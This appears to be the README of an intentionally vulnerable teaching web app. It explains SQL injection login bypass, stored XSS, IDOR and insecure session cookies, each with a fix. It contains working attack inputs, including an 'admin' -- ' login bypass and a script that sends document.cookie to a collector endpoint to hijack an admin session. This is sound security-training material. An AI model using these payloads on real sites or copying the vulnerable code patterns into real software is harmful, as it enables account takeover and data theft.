# 🍉 ViiLab — Custom Vulnerable Web App

> ⚠️ **For educational use only.** Contains intentional security vulnerabilities.
> Never deploy this outside a local/sandboxed environment.

A minimal notes app (Node.js/Express + SQLite) built to demonstrate four
real-world web vulnerabilities from the OWASP Top 10; plus a chained
attack that combines two of them into a full account takeover — each with
a working exploit and a fix path.

## Setup

```bash
npm install
node db/init.js      # seeds the database
node server.js        # runs on http://localhost:3000
```

Seeded accounts:

| Username | Password         |
|----------|------------------|
| alice    | alicepass123     |
| bob      | bobpass456       |
| admin    | S3cur3AdminPW!   |

---

## Vulnerability 1: SQL Injection — Authentication Bypass

**Where:** `POST /login` in `server.js`

**Root cause:** The login query is built with raw string concatenation
instead of a parameterized query:

```js
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**Exploit:** Log in with:
- Username: `admin' -- `
- Password: (anything)

The `--` comments out the rest of the query, so it becomes
`SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'`,
which matches the admin row regardless of password.

**Fix:** Use parameterized/prepared statements:
```js
const user = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?')
  .get(username, password);
```
(Passwords should also be hashed with bcrypt/argon2, never stored plaintext.)

---

## Vulnerability 2: Stored Cross-Site Scripting (XSS)

**Where:** `views/note.ejs`, note content field

**Root cause:** Note content is rendered with EJS's unescaped output tag:
```ejs
<div class="note-body"><%- note.content %></div>
```
`<%-` skips HTML-escaping. `<%=` (which the rest of the app correctly uses)
would escape it safely.

**Exploit:** Create a note with content:
```html
<script>alert(document.cookie)</script>
```
The script executes for anyone who views that note (including other users,
if combined with the IDOR below; this is how stored XSS becomes a session
hijacking vector in the real world).

**Fix:** Switch to `<%= note.content %>` for escaped output, or sanitize
input on write with a library like `sanitize-html` if limited formatting
needs to be preserved.

---

## Vulnerability 3: Broken Access Control (IDOR)

**Where:** `GET /notes/:id` in `server.js`

**Root cause:** The route fetches a note by ID with no check that the
logged-in user actually owns it:
```js
const note = db.prepare('SELECT * FROM notes WHERE id = ?').get(req.params.id);
// no ownership check before rendering
```

**Exploit:** Log in as alice, then visit `/notes/3` or `/notes/4` directly;
these belong to bob and admin respectively, and their private note content
(bob's bank PIN, admin's server info) is returned with no authorization
check at all.

**Fix:** Check ownership before returning data:
```js
if (note.owner_id !== req.session.user.id) {
  return res.status(403).send('Forbidden');
}
```

---

## Vulnerability 4: Insecure Session Cookie Configuration

**Where:** `server.js`, session middleware config

**Root cause:** The session cookie is explicitly set to `httpOnly: false`:
```js
app.use(session({ ..., cookie: { httpOnly: false } }));
```
This means client-side JavaScript (including an attacker's injected script)
can read `document.cookie` and see the session ID. With the default
`httpOnly: true`, cookies are invisible to JS entirely.

**Fix:** Remove the override (or explicitly set `httpOnly: true`), and add
`secure: true` when served over HTTPS so cookies are also unreadable
over unencrypted connections.

---

## Chained Attack: Stored XSS → Cookie Theft → Session Hijack → Admin Takeover

This is the "so what" that ties vulns #2 and #4 together into a real
account-takeover path, and demonstrates attacker thinking beyond isolated
bug-hunting.

**Scenario:** `bob` (a normal user) wants admin access but doesn't know
admin's password.

1. Bob posts a note to the shared **Community Board** (`/board` — visible
   to every logged-in user, including admin) containing:
   ```html
   <script>fetch("/steal?c="+document.cookie)</script>
   ```
2. When admin logs in and views `/board`, the script executes in admin's
   browser. Because the session cookie isn't `httpOnly`, the script can
   read it via `document.cookie` and send it to `/steal`; an endpoint
   standing in for an attacker-controlled collector server.
3. Bob checks `/collector` and retrieves admin's stolen session cookie.
4. Bob replaces his own `connect.sid` cookie with the stolen one and
   requests `/admin`.
5. The server has no way to tell the difference between admin's real
   browser and bob's forged request; same valid session ID, same
   access. Bob is now looking at the admin panel, having never touched
   admin's password.

**Run the full chain yourself:**
```bash
node server.js &
bash exploit_chain.sh
```

**Fix (defense in depth — any one of these breaks the chain):**
- Escape output on `/board` and `/notes/:id` (fixes the XSS entry point)
- Set `httpOnly: true` on the session cookie (script can no longer read it
  even if XSS exists)
- Add CSP headers restricting inline `<script>` execution
- Bind sessions to IP/User-Agent and rotate session IDs on privilege-
  sensitive actions, so a copied cookie alone isn't sufficient

---

## Notes

**Limitations:** single demo session secret (not production-safe even
after fixing all 4 vulns), no CSRF protection, no rate limiting on login,
no password hashing even post-fix (would need bcrypt added separately),
the "collector" endpoint is folded into the same app rather than a
genuinely separate attacker server, not built for concurrent multi-user
production load.

**Future improvements:** add a "patched" branch/mode toggle to demo
before/after side-by-side, add CSRF tokens, add password hashing + rate
limiting, add session rotation on login to further harden against hijack
even after cookie theft.
